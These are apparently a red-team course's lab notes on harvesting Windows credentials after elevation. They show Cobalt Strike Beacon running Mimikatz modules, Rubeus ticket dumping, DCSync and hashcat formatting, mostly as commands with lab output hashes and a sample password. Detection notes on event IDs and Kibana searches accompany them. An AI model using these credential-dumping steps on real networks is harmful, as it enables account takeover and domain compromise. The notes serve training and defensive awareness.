---
description: 09/09/2025
---

# Obtaining Credentials

Once we are elevated on a machine, we can obtain credential material for other users who are authenticated.

Credentials can come in the form of plaintext (username & password), hashes (NTLM, AES, DCC, NetNTLM, etc) as well as Kerberos tickets.

This chapter will review how to dump credentials in various formats.

{% hint style="info" %}
Stay tuned, the **User Impersonation** chapter will show how these different credential forms can be leveraged.
{% endhint %}

## Beacon + Mimikatz

<mark style="color:yellow;">Cobalt Strike has a built-in version of Mimikatz</mark> that we can use to extract various credential types. However, <mark style="color:yellow;">there are some differences regarding how it behaves in Beacon compared to the console version</mark>.

{% hint style="info" %}
Each time that you execute Mimikatz in Beacon, it does so in a new temporary process which is then destroyed. This means that you cannot run two "related" commands such as:

```
beacon> mimikatz token::elevate
beacon> mimikatz lsadump::sam
```
{% endhint %}

#### How to get around this...

We can chain multiple commands together by separating them with a semi-colon:

```
beacon> mimikatz token::elevate ; lsadump::sam

Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

552	{0;000003e7} 1 D 28330     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;000d4499} 2 F 3234168   	DEV\bfarmer	S-1-5-21-569305411-121244042-2357301523-1104	(15g,24p)	Primary
 * Thread Token  : {0;000003e7} 1 D 3295086   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)
Domain : WKSTN-2
SysKey : b9dc7de8b1972237bbbd7f82d970f79a
Local SID : S-1-5-21-2281971671-4135076198-2136761646

SAMKey : b0664279732686cfbb4b788c078fea82

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889
    lm  - 0: 91b6e660bcac036ae7ab67a3d383bc82
    ntlm- 0: fc525c9683e8fe067095ba2ddc971889
```

Beacon also has its own command convention using the `!` and the `@` symbol as "modifiers".

#### What's the difference?

<mark style="color:yellow;">The</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`!`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">elevates Beacon to</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`SYSTEM`</mark> before running the given command which is <mark style="color:green;">useful for when you're running in high-integrity, but need to impersonate</mark> <mark style="color:green;"></mark><mark style="color:green;">`SYSTEM`</mark>.

* In most cases, `!` is a direct replacement for the `token::elevate`.

For example:

```
beacon> mimikatz !lsadump::sam
```

<mark style="color:yellow;">The</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`@`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">impersonates Beacon's thread token before running the given command</mark>, which is <mark style="color:green;">useful in cases where Mimikatz needs to interact with a remote session, such as</mark> <mark style="color:green;"></mark><mark style="color:green;">`dcsync`</mark>.

This is compatible with other impersonation primitives such as `make_token` and `steal_token`.

**For example:**

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> make_token DEV\nlamb F3rrari
[+] Impersonated DEV\nlamb (netonly)

beacon> mimikatz @lsadump::dcsync /user:DEV\krbtgt
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 8/15/2022 4:01:04 PM
Object Security ID   : S-1-5-21-569305411-121244042-2357301523-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
    lm  - 0: 207d5e08551c51892309c0cf652c353b
```

### New Technology LAN Manager (NTLM) Hashes

<mark style="color:yellow;">The</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">**`sekurlsa::logonpasswords`**</mark> <mark style="color:yellow;">Mimikatz module is infamous for being able to "dump plaintext passwords from memory</mark>".

Having a user's password has obvious advantages and was a lucrative tactic for a long time.

However, since protections have improved over time, a lot of mitigations have been ruled out and we have to work along side them in order to get around them.

Disabling Digest Authentication ([wdigest](https://stealthbits.com/blog/wdigest-clear-text-passwords-stealing-more-than-a-hash/)) by default, so happening across plaintext passwords is certainly less common.

This <mark style="color:yellow;">module is still capable of retrieving NTLM hashes</mark> which is useful for pairing the _**Pass The Hash**_ or even cracking to recover the plaintext.

{% hint style="warning" %}
This command requires elevated privileges.
{% endhint %}

```
beacon> mimikatz !sekurlsa::logonpasswords

Authentication Id : 0 ; 579458 (00000000:0008d782)
Session           : Batch from 0
User Name         : jking
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 8/31/2022 11:49:48 AM
SID               : S-1-5-21-569305411-121244042-2357301523-1105
	msv :
	 [00000003] Primary
	 * Username : jking
	 * Domain   : DEV
	 * NTLM     : 59fc0f884922b4ce376051134c71e22c
	 * SHA1     : 74fa9854d529092b92e0d9ebef7ce3d065027f45
	 * DPAPI    : 0837e40088a674327961e1d03946f5f2
```

As you can see, <mark style="color:yellow;">it allows you to be able to obtain password hashes in a variety of formats such as NTLM, SHA1, and DPAPI</mark>.

<mark style="color:yellow;">Cobalt Strike has a short-hand command for this called</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`logonpasswords`</mark>.&#x20;

After dumping these credentials, go to **View -> Credentials** to see a copy of them.

{% hint style="danger" %}
OPSEC

This module will open a read handle to LSASS which can be logged under event `4656`. Use the "Suspicious Handle to LSASS" saved search in Kibana (Event Manager) to see them.
{% endhint %}

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

This shows the user `WKSTN-2$` (which means `SYSTEM` on `WKSTN-2`) obtained a handle to _**LSASS**_ from `powershell.exe` with an access mask of 0x1010.  This comes from the flags `PROCESS_QUERY_LIMITED_INFORMATION` (`0x1000`) and `PROCESS_VM_READ` (`0x0010`), which is consistent with the [Mimikatz source code](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L163).

{% hint style="danger" %}
This is known as an Indicator of Compromise (IoC).&#x20;

If it wasn't obvious enough, this can alert blue teamers to potential compromise.
{% endhint %}

## Kerberos Encryption Keys

<mark style="color:yellow;">The</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`sekurlsa::ekeys`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">Mimikatz module will dump the Kerberos encryption keys of currently logged on users</mark>.

Since modern Windows services will choose to use Kerberos over NTLM, leveraging these instead of NTLM hashes makes more sense for blending in along with the normal authentication traffic that goes across the wire.

* <mark style="color:$danger;">These Kerberos keys can be used to abuse Kerberos in a variety of scenarios</mark>

{% hint style="warning" %}
This command requires ELEVATED privileges.
{% endhint %}

```
beacon> mimikatz !sekurlsa::ekeys

Authentication Id : 0 ; 459935 (00000000:0007049f)
Session           : Batch from 0
User Name         : jking
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 9/1/2022 7:29:19 AM
SID               : S-1-5-21-569305411-121244042-2357301523-1105

	 * Username : jking
	 * Domain   : DEV.CYBERBOTIC.IO
	 * Password : (null)
	 * Key List :
	   aes256_hmac       4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6
	   rc4_hmac_nt       59fc0f884922b4ce376051134c71e22c
	   rc4_hmac_old      59fc0f884922b4ce376051134c71e22c
	   rc4_md4           59fc0f884922b4ce376051134c71e22c
	   rc4_hmac_nt_exp   59fc0f884922b4ce376051134c71e22c
	   rc4_hmac_old_exp  59fc0f884922b4ce376051134c71e22c
```

{% hint style="info" %}
It is important to note that Mimikatz may incorrectly label all of the hashes as `des_cbc_md4`.

In this case, the AES-256 key is the one that we want!!
{% endhint %}

These hashes are not automatically populated within the Credential data model, but they can be added manually in **View -> Credentials -> Add**.

{% hint style="danger" %}
OPSEC&#x20;

This module also opens a read handle to LSASS.
{% endhint %}

## What is LSASS

We've mentioned LSASS, but what really is it?

LSASS, or the Local Security Authority Subsystem Service (LSASS), is a process in Windows OS' that is responsible for enforcing the security policy on the system.

Essentially, <mark style="color:green;">it</mark> <mark style="color:green;"></mark>_<mark style="color:green;">**verifies**</mark>_ <mark style="color:green;"></mark><mark style="color:green;">users logging on to a Windows computer/server, handles password changes, and creates access tokens</mark>.

Since it is so powerful and an often target by attackers, blue teamers have alerts for this kind of behavior to alert to them when a handle is opened to LSASS; resulting in a potential IoC.

## Security Account Manager (SAM)

The Security Account Manager (<mark style="color:yellow;">SAM</mark>) <mark style="color:yellow;">database holds the NTLM hashes of local accounts only</mark>.

These can be dumped via the `lsadump::sam` Mimikatz module.&#x20;

<mark style="color:yellow;">If a common local administrator account is being used with the same password across an environment, this can make it very trivial to move laterally</mark>.

{% hint style="warning" %}
This command requires ELEVATED privileges.
{% endhint %}

```
beacon> mimikatz !lsadump::sam
	
Domain : WKSTN-2
SysKey : b9dc7de8b1972237bbbd7f82d970f79a
Local SID : S-1-5-21-2281971671-4135076198-2136761646

SAMKey : b0664279732686cfbb4b788c078fea82

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889
    lm  - 0: 91b6e660bcac036ae7ab67a3d383bc82
    ntlm- 0: fc525c9683e8fe067095ba2ddc971889
```

{% hint style="info" %}
OPSEC

This module will open a handle to the SAM Registry hive.&#x20;

You can use the "Suspicial SAM Hive Handle" saved search in Kabana to see them.
{% endhint %}

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

## Domain Cached Credentials (DCC)

<mark style="color:yellow;">Domain Cached Credentials was designed for instances where domain credentials are required to logon to a machine, even while it's disconnected from the domain</mark> (_**think of a roaming laptop**_ for example).

The <mark style="color:yellow;">local device caches the domain credentials so authentication can happen locally</mark>, <mark style="color:$danger;">but these can be extracted and cracked offline to recover plaintext credentials</mark>.

Unfortunately, the hash format is not NTLM, so it can't be used to _**Pass The Hash**_.

<mark style="color:$danger;">The only viable use for these is to crack them offline</mark>.

The `lsadump::cache` Mimikatz module can extract these from `HKLM\SECURITY` in the Registry.

{% hint style="warning" %}
This command requires ELEVATED privileges.
{% endhint %}

```
beacon> mimikatz !lsadump::cache

Domain : WKSTN-2
SysKey : b9dc7de8b1972237bbbd7f82d970f79a

Local name : WKSTN-2 ( S-1-5-21-2281971671-4135076198-2136761646 )
Domain name : DEV ( S-1-5-21-569305411-121244042-2357301523 )
Domain FQDN : dev.cyberbotic.io

Policy subsystem is : 1.18
LSA Key(s) : 1, default {9f88abd7-1cb9-d741-372b-c883b3cbf843}
  [00] {9f88abd7-1cb9-d741-372b-c883b3cbf843} c38164900449d2c6d81b557198ab0cbda2c0ce1c9f57c717cb221032ba1adffb

* Iteration is set to default (10240)

[NL$1 - 9/1/2022 8:10:06 AM]
RID       : 00000450 (1104)
User      : DEV\bfarmer
MsCacheV2 : 98e6eec9c0ce004078a48d4fd03f2419

[NL$2 - 9/1/2022 10:29:19 AM]
RID       : 00000451 (1105)
User      : DEV\jking
MsCacheV2 : 0d50dee9ed3f29d00282168297090d2a
```

### Cracking

<mark style="color:yellow;">To crack these with</mark> [<mark style="color:yellow;">hashcat</mark>](https://hashcat.net/hashcat/)<mark style="color:yellow;">, we need to transform them into the expected format</mark>.

The [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) shows us it should be: <mark style="color:yellow;">`$DCC2$<iterations>#<username>#<hash>`</mark>.

{% hint style="warning" %}
DCC is orders of magnitude slower to crack than NTLM.
{% endhint %}

{% hint style="danger" %}
OPSEC

This module, `mimikatz !lsadump::cache`, will open a handle to the `SECURITY` Registry hive.

You can use the "Suspicious SECURITY Hive Handle" saved search in Kabana to see them.
{% endhint %}

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

## Extracting Kerberos Tickets

<mark style="color:$danger;">One unfortunate consequence of the aforementioned techniques is that they obtain handles to sensitive resources</mark>.

As mentioned earlier, _<mark style="color:$danger;">**this can be audited and logged by blue teamers easily**</mark>_.

[Rubeus](https://github.com/GhostPack/Rubeus) <mark style="color:yellow;">is a C# tool designed for Kerberos interaction and abuses, using legitimate Windows APIs</mark>.

Its <mark style="color:yellow;">`triage`</mark> command will list all the Kerberos tickets in your current logon session and if elevated, from all logon sessions on the machine.

**See below:**

```
eacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x14b5fa

 ----------------------------------------------------------------------------------------------------------------- 
 | LUID     | UserName                     | Service                                       | EndTime             |
 ----------------------------------------------------------------------------------------------------------------- 
 | 0x14bf5e | bfarmer @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 9/1/2022 6:10:14 PM |
 | 0x14bf5e | bfarmer @ DEV.CYBERBOTIC.IO  | LDAP/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 9/1/2022 6:10:14 PM |
 | 0x14bf5e | bfarmer @ DEV.CYBERBOTIC.IO  | HTTP/squid.dev.cyberbotic.io                  | 9/1/2022 6:10:14 PM |
 | 0x14b5fa | bfarmer @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 9/1/2022 6:10:07 PM |
 | 0x14b5fa | bfarmer @ DEV.CYBERBOTIC.IO  | cifs/dc-2.dev.cyberbotic.io                   | 9/1/2022 6:10:07 PM |
 | 0x14b5fa | bfarmer @ DEV.CYBERBOTIC.IO  | ldap/dc-2.dev.cyberbotic.io                   | 9/1/2022 6:10:07 PM |
 | 0x14b5fa | bfarmer @ DEV.CYBERBOTIC.IO  | cifs/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 9/1/2022 6:10:07 PM |
 | 0x14b5fa | bfarmer @ DEV.CYBERBOTIC.IO  | LDAP/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 9/1/2022 6:10:07 PM |
 | 0x7049f  | jking @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 9/1/2022 5:29:20 PM |
 | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 9/1/2022 5:28:29 PM |
 | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | HTTP/squid.dev.cyberbotic.io                  | 9/1/2022 5:28:29 PM |
 | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-2.dev.cyberbotic.io                   | 9/1/2022 5:28:29 PM |
 | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 9/1/2022 5:28:29 PM |
 | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 9/1/2022 5:28:29 PM |
 | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | HTTP/squid.dev.cyberbotic.io                  | 9/1/2022 5:28:29 PM |
 | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 9/1/2022 5:28:29 PM |
 | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | WKSTN-2$                                      | 9/1/2022 5:28:29 PM |
 | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | LDAP/dc-2.dev.cyberbotic.io                   | 9/1/2022 5:28:29 PM |
 | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | LDAP/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 9/1/2022 5:28:29 PM |
 | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | wkstn-2$@DEV.CYBERBOTIC.IO                    | 9/1/2022 7:43:42 AM |
 ----------------------------------------------------------------------------------------------------------------- 
```

_<mark style="color:yellow;">**Each user has their own logon session**</mark>_, which is _<mark style="color:yellow;">**represented by a LUID**</mark>_ (Locally Unique Identifier).

In this example, we're operating within the _**LUID**_ of <mark style="color:yellow;">`bfarmer`</mark><mark style="color:yellow;">,</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`0x14b5fa`</mark>.

The <mark style="color:yellow;">`WKSN-2$`</mark> machine account has its own session, <mark style="color:yellow;">`0x3e4`</mark>; and <mark style="color:yellow;">`jking`</mark> also has a session, <mark style="color:yellow;">`0x7049f`</mark>.

### Tickets

<mark style="color:yellow;">Tickets for the service name</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`krbtgt`</mark> are known as _<mark style="color:yellow;">**Ticket Granting Tickets**</mark>_ (TGTs) and others are _<mark style="color:yellow;">**Ticket Granting Service Tickets**</mark>_ (TGSs).

* We will be diving more into the differences in the two within the Kerberos section

Rubeus' <mark style="color:yellow;">`dump`</mark> <mark style="color:green;">command can extract these tickets from memory, but since because it uses the WinAPIs, it does not need to open suspicious handles to LSASS</mark>!

{% hint style="warning" %}
If not elevated, we can only pull tickets from our own session.&#x20;
{% endhint %}

Without further command-line arguments, Rubeus will extract all tickets possible, but we can be more specific by utilizing the `/luid` and `/service` parameters.

For example, if we only wanted the _<mark style="color:yellow;">**TGT**</mark>_ <mark style="color:yellow;"></mark><mark style="color:yellow;">for</mark> <mark style="color:yellow;">`jking`</mark>, we can do:

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt

Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x7049f
[*] Current LUID    : 0x14b5fa

  UserName                 : jking
  Domain                   : DEV
  LogonId                  : 0x754c2
  UserSID                  : S-1-5-21-569305411-121244042-2357301523-1105
  AuthenticationPackage    : Kerberos
  LogonType                : Batch
  LogonTime                : 10/13/2022 9:36:19 AM
  LogonServer              : DC-2
  LogonServerDNSDomain     : DEV.CYBERBOTIC.IO
  UserPrincipalName        : jking@cyberbotic.io


    ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
    ServiceRealm             :  DEV.CYBERBOTIC.IO
    UserName                 :  jking
    UserRealm                :  DEV.CYBERBOTIC.IO
    StartTime                :  10/13/2022 9:36:20 AM
    EndTime                  :  10/13/2022 7:36:20 PM
    RenewTill                :  10/20/2022 9:36:20 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  EIkrCAL8wx98PVRBOZGDKC6Y0KReSosWtvXyv6rIefI=
    Base64EncodedTicket   :

      doIFuj [...snip...] lDLklP
```

This will output the ticket(s) in `base64` encoded format.

{% hint style="success" %}
&#x20;You may also add the `/nowrap` option which will format the base64 encoding onto a single line - this makes copy & pasting much easier.
{% endhint %}

## DCSync (Domain Controller Synchronization)

The [Directory Replication Service (MS-DRSR) protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47) is used to synchronize and replicate Active Directory data between domain controllers.

DCSync is a technique which leverages this protocol to extract _**username**_ and _**credential data**_ from a Domain Controller (DC).

{% hint style="warning" %}
This requires [GetNCChanges](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894) which is usually only available to domain admins.  The technique is included here for completeness, and it will be useful later on.
{% endhint %}

**Beacon has a dedicated&#x20;**<mark style="color:yellow;">**`dcsync`**</mark>**&#x20;command, which calls&#x20;**<mark style="color:yellow;">**`mimikatz lsadump::dcsync`**</mark>**&#x20;in the background:**

```
beacon> make_token DEV\nlamb F3rrari

beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

Credentials:
  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
    lm  - 0: 207d5e08551c51892309c0cf652c353b
		
* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
      aes128_hmac       (4096) : 6fb62ed56c7de778ca5e4fe6da6d3aca
      des_cbc_md5       (4096) : 629189372a372fda
```

Here, <mark style="color:yellow;">we have extracted the NTLM and AES keys</mark> for the <mark style="color:yellow;">`krbtgt`</mark> account using <mark style="color:yellow;">`nlamb`</mark> (**a domain admin**).

{% hint style="danger" %}
OPSEC

Directory replication can be detected if Directory Service Access auditing is enabled, by searching for `4662` events where the identifying GUID is `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (for `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`) or `89e95b76-444d-4c62-991a-0facbeda640c` (`DS-Replication-Get-Changes-In-Filtered-Set`).\
\
Find these using the "Suspicious Directory Replication" saved search in Kibana.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

<mark style="color:$danger;">Replication traffic usually only occurs between domain controllers</mark> but can also be seen via applications such as [Azure AD Connect](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-azure-ad-connect).  Mature organizations should baseline typical DRS traffic to find suspicious outliers (identifying IoCs).
